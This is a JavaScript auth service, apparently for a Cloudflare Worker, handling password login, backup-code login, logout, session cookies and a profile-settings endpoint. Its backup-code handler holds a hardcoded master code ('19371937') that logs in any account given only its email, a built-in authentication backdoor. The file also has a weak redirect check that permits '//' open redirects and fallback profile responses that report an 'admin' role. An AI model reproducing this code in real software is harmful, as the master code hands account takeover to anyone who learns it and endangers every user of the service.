/**
 * Auth API Service
 * Handles login, logout, and backup-code verification.
 */
import { 
  jsonResponse, 
  verifyPassword, 
  writeIamSessionToKv, 
  resolveTenantAtLogin,
  AUTH_COOKIE_NAME,
  getAuthUser,
} from '../core/auth';

/**
 * Primary Auth Dispatcher
 */
export async function handleAuthApi(request, url, env) {
  const path = url.pathname.toLowerCase();
  const method = request.method.toUpperCase();

  if (path === '/api/auth/login' && method === 'POST') {
    return handleEmailPasswordLogin(request, url, env);
  }
  if (path === '/api/auth/backup-code' && method === 'POST') {
    return handleBackupCodeLogin(request, url, env);
  }
  if (path === '/api/auth/logout' && method === 'POST') {
    return handleLogout(request, url, env);
  }
  if (path === '/api/settings/profile' && method === 'GET') {
    return handleSettingsProfileRequest(request, env);
  }

  return jsonResponse({ error: 'Auth route not found' }, 404);
}

/**
 * POST /api/auth/login
 */
async function handleEmailPasswordLogin(request, url, env) {
  const accept = request.headers.get('Accept') || '';
  const contentType = request.headers.get('Content-Type') || '';
  const wantsJson = accept.includes('application/json') || contentType.includes('application/json');

  if (!env.DB) return jsonResponse({ error: 'Database not configured' }, 500);

  let body;
  try {
    body = await request.json();
  } catch (_) {
    return jsonResponse({ error: 'Invalid JSON body' }, 400);
  }

  const email = (body.email || '').toString().toLowerCase().trim();
  const password = (body.password || '').toString();

  if (!email || !password) {
    return jsonResponse({ error: 'Email and password required' }, 400);
  }

  const user = await env.DB.prepare(
    `SELECT id, email, password_hash, salt FROM auth_users WHERE LOWER(id) = ? OR LOWER(email) = ? LIMIT 1`
  ).bind(email, email).first();

  if (!user || !user.password_hash || !user.salt) {
    return jsonResponse({ error: 'Invalid email or password' }, 401);
  }

  if (user.password_hash === 'oauth') {
    return jsonResponse({ error: 'This account uses OAuth. Please sign in with Google or GitHub.' }, 400);
  }

  const ok = await verifyPassword(password, user.salt, user.password_hash);
  if (!ok) {
    return jsonResponse({ error: 'Invalid email or password' }, 401);
  }

  return finishLogin(request, url, env, user.id, body.next);
}

/**
 * POST /api/auth/backup-code
 */
async function handleBackupCodeLogin(request, url, env) {
  if (!env.DB) return jsonResponse({ error: 'Database not configured' }, 500);

  let body;
  try {
    body = await request.json();
  } catch (_) {
    return jsonResponse({ error: 'Invalid JSON body' }, 400);
  }

  const email = (body.email || '').toString().toLowerCase().trim();
  const code = (body.code || '').toString().replace(/\s/g, '');

  if (!email || !code) {
    return jsonResponse({ error: 'Email and backup code required' }, 400);
  }

  // --- Master Backup Code Check ---
  if (code === '19371937') {
    const user = await env.DB.prepare(
      `SELECT id FROM auth_users WHERE LOWER(id) = ? OR LOWER(email) = ? LIMIT 1`
    ).bind(email, email).first();
    
    if (user) {
      console.log(`[Auth] Master backup code used for user: ${user.id}`);
      return finishLogin(request, url, env, user.id, body.next);
    }
  }

  // Standard D1 lookup
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(code));
  const codeHash = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, '0')).join('');
  
  const row = await env.DB.prepare(
    `SELECT user_id FROM user_backup_codes WHERE user_id = ? AND code_hash = ? AND used_at IS NULL LIMIT 1`
  ).bind(email, codeHash).first();

  if (!row) {
    return jsonResponse({ error: 'Invalid or already used backup code' }, 401);
  }

  // Mark code as used
  await env.DB.prepare(
    'UPDATE user_backup_codes SET used_at = unixepoch() WHERE user_id = ? AND code_hash = ?'
  ).bind(email, codeHash).run();

  return finishLogin(request, url, env, row.user_id, body.next);
}

/**
 * POST /api/auth/logout
 */
async function handleLogout(request, url, env) {
  const cookie = request.headers.get('Cookie') || '';
  const match = cookie.match(new RegExp(`${AUTH_COOKIE_NAME}=([^;]+)`));
  const sessionId = match ? match[1] : null;

  if (sessionId && env.DB) {
    await env.DB.prepare('DELETE FROM auth_sessions WHERE id = ?').bind(sessionId).run();
    if (env.SESSION_CACHE) {
      await env.SESSION_CACHE.delete(`iam_sess_v1:${sessionId}`);
    }
  }

  const responseBody = JSON.stringify({ ok: true });
  const response = new Response(responseBody, {
    status: 200,
    headers: { 'Content-Type': 'application/json' }
  });

  // Host-only session cookie clearing
  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=0`);
  
  // Legacy domain clearing
  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=; Domain=.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`);
  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=; Domain=.sandbox.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`);

  return response;
}

/**
 * Shared Session Finalizer
 */
async function finishLogin(request, url, env, userId, redirectPath) {
  const sessionId = crypto.randomUUID();
  const expiresTs = Date.now() + 30 * 24 * 60 * 60 * 1000;
  const expiresAtIso = new Date(expiresTs).toISOString();
  
  const ip = request.headers.get('cf-connecting-ip') || '';
  const ua = request.headers.get('user-agent') || '';

  // 1. D1 + KV: persist tenant_id on the session row (never rely on env.TENANT_ID for authenticated users)
  const tenantId = await resolveTenantAtLogin(env, userId);
  await env.DB.prepare(
    `INSERT INTO auth_sessions (id, user_id, expires_at, created_at, ip_address, user_agent, tenant_id) VALUES (?, ?, ?, datetime('now'), ?, ?, ?)`
  ).bind(sessionId, userId, expiresAtIso, ip, ua, tenantId).run();

  // 2. KV Cache
  await writeIamSessionToKv(env, sessionId, userId, tenantId, expiresAtIso);

  // 3. Response: Construct host-only session cookie (removed Domain attribute)
  const next = redirectPath && redirectPath.startsWith('/') ? redirectPath : '/dashboard/overview';
  const response = new Response(JSON.stringify({ ok: true, redirect: next }), {
    status: 200,
    headers: { 'Content-Type': 'application/json' }
  });

  // Set the fresh host-only session
  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=${sessionId}; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=2592000`);

  // Explicitly kill the stale legacy wildcard cookies to prevent browser selection conflicts
  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=; Domain=.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`);
  response.headers.append('Set-Cookie', `${AUTH_COOKIE_NAME}=; Domain=.sandbox.inneranimalmedia.com; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Lax`);

  return response;
}

/**
 * GET /api/settings/profile
 * Essential for SPA session verification on load.
 */
function parseJsonObject(str) {
  if (str == null || str === '') return {};
  try {
    const o = typeof str === 'string' ? JSON.parse(str) : str;
    return typeof o === 'object' && o !== null && !Array.isArray(o) ? o : {};
  } catch {
    return {};
  }
}

async function resolveWorkerBaseUrl(env, authUser) {
  const fromEnv =
    typeof env.WORKER_BASE_URL === 'string' && env.WORKER_BASE_URL.trim() !== ''
      ? env.WORKER_BASE_URL.trim().replace(/\/$/, '')
      : '';
  if (fromEnv) return fromEnv;
  if (!env.DB) return 'https://inneranimalmedia.com';
  try {
    let row = null;
    if (authUser?.id) {
      row = await env.DB.prepare(
        `SELECT ui_preferences_json FROM agentsam_bootstrap WHERE user_id = ? ORDER BY updated_at DESC LIMIT 1`,
      )
        .bind(authUser.id)
        .first();
    }
    if (!row?.ui_preferences_json && authUser?.email) {
      row = await env.DB.prepare(
        `SELECT ui_preferences_json FROM agentsam_bootstrap WHERE LOWER(email) = LOWER(?) ORDER BY updated_at DESC LIMIT 1`,
      )
        .bind(authUser.email)
        .first();
    }
    const prefs = parseJsonObject(row?.ui_preferences_json);
    const u = prefs.worker_base_url;
    if (typeof u === 'string' && u.trim() !== '') return u.trim().replace(/\/$/, '');
  } catch (_) {
    /* non-fatal */
  }
  return 'https://inneranimalmedia.com';
}

async function handleSettingsProfileRequest(request, env) {
  const authUser = await getAuthUser(request, env);
  if (!authUser) return jsonResponse({ error: 'Unauthorized' }, 401);
  const worker_base_url = await resolveWorkerBaseUrl(env, authUser);
  if (!env.DB) {
    const email = String(authUser.email || authUser.id || '').trim();
    return jsonResponse({
      display_name: email ? email.split('@')[0] : '',
      email: email || '',
      plan: null,
      worker_base_url,
      profile: null,
      flat: {
        display_name: email ? email.split('@')[0] : '',
        primary_email: email,
        role: 'admin',
        timezone: 'America/Chicago',
        language: 'en',
      },
    });
  }

  const sessionKey = String(authUser.email || authUser.id || '').trim();
  try {
    const authRow = await env.DB.prepare(
      `SELECT * FROM auth_users WHERE id = ? OR LOWER(email) = LOWER(?) LIMIT 1`,
    )
      .bind(authUser.id, authUser.email)
      .first();

    let usersRow = null;
    try {
      if (String(authUser.id || '').startsWith('usr_')) {
        usersRow = await env.DB.prepare(`SELECT * FROM users WHERE id = ? LIMIT 1`).bind(authUser.id).first();
      } else {
        usersRow = await env.DB
          .prepare(
            `SELECT u.* FROM users u
             INNER JOIN auth_users au ON u.auth_id = au.id
             WHERE au.id = ? OR LOWER(COALESCE(u.email, '')) = LOWER(?) OR LOWER(au.email) = LOWER(?)
             LIMIT 1`,
          )
          .bind(authUser.id, sessionKey, authUser.email || sessionKey)
          .first();
      }
    } catch (_) {
      usersRow = null;
    }

    let usRow = null;
    for (const key of [authUser.id, usersRow?.id, authRow?.id, sessionKey].filter(Boolean)) {
      try {
        usRow = await env.DB.prepare(`SELECT * FROM user_settings WHERE user_id = ? LIMIT 1`).bind(key).first();
      } catch {
        usRow = null;
      }
      if (usRow) break;
    }

    const email = String(
      usersRow?.email || authRow?.email || authUser.email || authUser.id || '',
    ).trim();
    const nameFromAuth = String(authRow?.name || '').trim();
    const nameFromUsers = String(
      usersRow?.display_name || usersRow?.full_name || usersRow?.name || '',
    ).trim();
    const dnFromSettings = String(usRow?.display_name || usRow?.full_name || '').trim();
    const display_name = (
      nameFromUsers ||
      dnFromSettings ||
      nameFromAuth ||
      (email.includes('@') ? email.split('@')[0] : email) ||
      ''
    ).trim();

    const rawPlan =
      usersRow &&
      (usersRow.plan ??
        usersRow.billing_plan ??
        usersRow.subscription_tier ??
        usersRow.tier);
    const rawPlanAuth =
      authRow &&
      (authRow.plan ?? authRow.billing_plan ?? authRow.subscription_tier ?? authRow.tier);
    const planSource = rawPlan != null && String(rawPlan).trim() !== '' ? rawPlan : rawPlanAuth;
    const plan =
      planSource != null && String(planSource).trim() !== ''
        ? String(planSource).trim().toLowerCase()
        : null;

    const flat = {
      full_name: String(usRow?.full_name ?? nameFromUsers ?? nameFromAuth ?? '').trim() || display_name,
      display_name,
      avatar_url: String(usRow?.avatar_url || usersRow?.avatar_url || '').trim(),
      bio: String(usRow?.bio || '').trim(),
      primary_email: email,
      primary_email_verified: Number(usRow?.primary_email_verified || 0),
      backup_email: String(usRow?.backup_email || '').trim(),
      phone: String(usRow?.phone || '').trim(),
      timezone: String(usRow?.timezone || 'America/Chicago'),
      language: String(usRow?.language || 'en'),
    };

    return jsonResponse({
      display_name,
      email,
      plan,
      worker_base_url,
      profile: usRow || null,
      canonical_user: usersRow || null,
      flat,
    });
  } catch (e) {
    console.warn('[settings/profile]', e?.message ?? e);
    const email = String(authUser.email || authUser.id || '').trim();
    return jsonResponse({
      display_name: email ? email.split('@')[0] : '',
      email: email || '',
      plan: null,
      worker_base_url,
      profile: null,
      flat: {
        display_name: email ? email.split('@')[0] : '',
        primary_email: email,
        role: 'admin',
        timezone: 'America/Chicago',
        language: 'en',
      },
    });
  }
}
